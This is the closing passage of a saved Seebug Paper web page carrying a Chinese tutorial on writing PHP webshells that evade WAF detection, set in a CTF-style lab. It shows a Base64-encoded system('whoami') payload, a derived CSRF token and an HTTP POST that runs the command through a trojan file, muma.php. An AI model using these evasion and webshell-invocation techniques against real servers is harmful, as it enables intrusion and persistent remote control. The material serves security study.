<p>然后通过上文写的解密PHP，通过第一步获得的 <code>Token</code> 值和最终Base64加密后的字符串 <code>c3lzdGVtKCd3aG9hbWknKTsg</code>，拿到得到 <code>X-CSRF-TOKEN</code></p>
<p><img alt="样例三-2.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729086000-17vrvrw.png-w331s"></p>
<p><strong>注：这不是对WebShell发包，而是我上面写的解密PHP decode.php 来进行解密</strong></p>
<h4 id="1233">12.3.3 第三步，利用木马成功执行命令</h4>
<p>现在已经拿到 <code>X-CSRF-TOKEN</code> 和 <code>Cookie</code> 了，那就直接发包即可</p>
<pre class="codehilite language-http"><code class=" language-http">POST /muma.php HTTP/1.1
<span class="token keyword">Host:</span> test.ctf.com
<span class="token keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
<span class="token keyword">Content-Type:</span> application/x-www-form-urlencoded
<span class="token keyword">Cookie:</span> PHPSESSID=6g4sgte2t8nnv65u8er5cfdtnq;
<span class="token keyword">X-CSRF-TOKEN:</span> AgEOSQIkN015dlcKVX4MDQNlCV0tNxJe
<span class="token keyword">Content-Length:</span> 0</code></pre>


<p>可以看到，成功执行系统命令 <code>whoami</code> 了</p>
<p><img alt="样例三-3.png" src="./PHP 从零学习到 Webshell 免杀手册_files/1696729086000-18jzbeg.png-w331s"></p>
<p>所以你学废了吗？更多有趣的WebShell免杀案例等我后续更新~</p>
<h1 id="_3">四、总结</h1>
<p>上面分享了诸多姿势，重点还是灵活依靠思路和姿势，通过活用各种特性和函数来和WAF对抗，相信你自己也可以的！</p>
<p>在写这个整理的文档的时候，也收获颇多，希望各位师傅能认真研读，小人不才望大佬多加指正</p>
<p>其实在我个人的眼里，安全对抗其实就是人与人之间的灵魂、思维在碰撞和对抗，我一直执着于这个过程，也欢迎各位师傅和我互相学习、共同进步哈哈~</p>
<p>我的个人Github：<a href="https://github.com/AabyssZG/" title=" https://github.com/AabyssZG/"> https://github.com/AabyssZG/</a></p>
<p><img alt="" src="./PHP 从零学习到 Webshell 免杀手册_files/8a0c0997-0cdf-4d7e-a2ef-08e56952d98d.jpg-w331s"></p>
        
<hr>
<p><img src="./PHP 从零学习到 Webshell 免杀手册_files/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/3044/">https://paper.seebug.org/3044/</a></p>
            
    </section>

    <nav class="pagination" role="navigation" style="padding: 3rem;">
        
        <a class="newer-posts" href="https://paper.seebug.org/3043/"><span aria-hidden="true">←</span>
            Jumpserver 安全一窥：Sep 系列漏洞深度解析
        </a>

        
        
        <a class="older-posts" href="https://paper.seebug.org/3045/">Windows Defender 数据库结构分析（上） <span aria-hidden="true">→</span></a>
        
    </nav>


    

    
    <footer class="post-footer">
        <figure class="author-image">
            <a class="img" href="https://paper.seebug.org/users/author/?nickname=%E6%9B%BE%E5%93%A5" style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span class="hidden">'s Picture</span></a>r
        </figure>

        <section class="author">
            <h4><a href="https://paper.seebug.org/users/author/?nickname=%E6%9B%BE%E5%93%A5">曾哥</a>
            </h4>
            <p class="author-desc"><span></span></p>
            <p>阅读更多有关<a href="https://paper.seebug.org/users/author/?nickname=%E6%9B%BE%E5%93%A5">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
        </section>


    </footer>
    
    
    <br>

    <section class="plugin_comment">
        <div class="error-box">

        </div>

        <!--评论表单 begin-->
        <form action="https://paper.seebug.org/3044/" class="comment-form" id="j-comment-form" data-vul-id="" style="margin-bottom: 20px;">
            <input type="hidden" name="csrfmiddlewaretoken" value="3MV633cmGz9YUdlv7sMMbcETLS78yTfi2vjYtdoAXvfRGUjAAUSnxGI2F4vLEHio">
            <div class="row">
                <div class="col-md-offset-1">
                    <div class="col-md-5" style="margin-bottom: 20px">
                        <div class="input-group">
                            <span class="input-group-addon" id="basic-addon1">昵称</span>
                            <input type="text" class="form-control" placeholder="昵称(必填)" aria-describedby="basic-addon1" name="nickname" id="nickname">
                        </div>
                    </div>
                    <div class="col-md-6" style="margin-bottom: 20px">
                        <div class="input-group">
                            <span class="input-group-addon" id="basic-addon1">邮箱</span>
                            <input type="email" class="form-control" placeholder="邮箱(必填)" aria-describedby="basic-addon1" id="email" name="email">
                        </div>
                    </div>
                </div>
                <div class="col-md-1 hidden-xs">
                    <img src="./PHP 从零学习到 Webshell 免杀手册_files/anonymous.jpg" alt="" class="avatar-b img-circle">
                </div>
                <div class="col-md-11">
                    <div class="input-group">
                                <textarea id="comment_content" cols="30" rows="10" style="resize: none" placeholder="请多说一点吧(10个字以上)" class="form-control"></textarea>
                        <span class="input-group-btn">
                    <button type="button" class="btn btn-brand-fill btn-submit-comment post-comment" name="post-comment" id="post-comment">提交评论</button>
                  </span>
                    </div>
                    <span style="color: red;font-size: 13px">* 注意:请正确填写邮箱，消息将通过邮箱通知！</span>
                </div>
            </div>
        </form>
        <!--评论表单 end-->
        
        <h4 style="font-weight: normal;font-size: 16px;padding-left: 20px;padding-bottom:20px;" id="comment-count">暂无评论</h4>
        
        <!--评论列表 begin-->
        <ul class="list-unstyled comment-list" id="j-comment-list">
            
        </ul>
        <!--评论列表 end-->

    </section>

</article>
<section class="plugin_feedback"></section>
<section class="back-top" id="backtop" style="display: none;">
    <div class="backtopFlxed new_backtop">
        <div class="back-top-font fa fa-angle-up">
        </div>
    </div>
</section>


  </div>
</main>
</div>

<script src="./PHP 从零学习到 Webshell 免杀手册_files/gt.js.下载">
<script type="text/javascript" src="/static/vendors/bootstrap/dist/js/bootstrap.min.js"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/jquery.fitvids.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/index.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/prism-loader.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/prism.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/jquery.ghostHunter.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/js.cookie.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/plugin_comment.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/custom.js.下载"></script>
<script type="text/javascript" src="./PHP 从零学习到 Webshell 免杀手册_files/jweixin-1.6.0.js.下载"></script>
<script>
  wx.config({
    'appId': 'wx46c209f251516b33',
    'debug': 'False' !== 'False',
    'nonceStr': 'cobxDTq4qD8op7l',
    'signature': 'e76228041c6890a8863ccb7acb9bbe7ed849eca0',
    'timestamp': '1696901332',
    'jsApiList': [
      
        'checkJsApi',
      
        'updateTimelineShareData',
      
        'updateAppMessageShareData',
      
    ],
  });
</script>


<script>
    wx.ready(function () {

        var title = '' || document.title;
        var link = window.location.href;
        var imgUrl = '' || 'https://paper.seebug.org' + '/static/images/weixin-share-seebug.jpg';
        var desc = '' || 'Seebug Paper 安全技术精粹';

        // “分享给朋友”及“分享到QQ”
        wx.updateAppMessageShareData({
            title: title, // 分享标题
            desc: desc, // 分享描述
            link: link, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致
            imgUrl: imgUrl, // 分享图标
            success: function () {
                // 设置成功
            },
            cancel: function () {
                // 用户取消分享后执行的回调函数
            }
        });

        // “分享到朋友圈”及“分享到QQ空间”
        wx.updateTimelineShareData({
            title: title, // 分享标题
            link: link, // 分享链接，该链接域名或路径必须与当前页面对应的公众号JS安全域名一致
            imgUrl: imgUrl, // 分享图标
            success: function () {
                // 设置成功
            },
            cancel: function () {
                // 用户取消分享后执行的回调函数
            }
        })


    })
</script>


<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  config: ["MMLorHTML.js"],
  showMathMenu: false,
  jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
  extensions: ["MathMenu.js", "MathZoom.js"],
});




</script>





</body></html>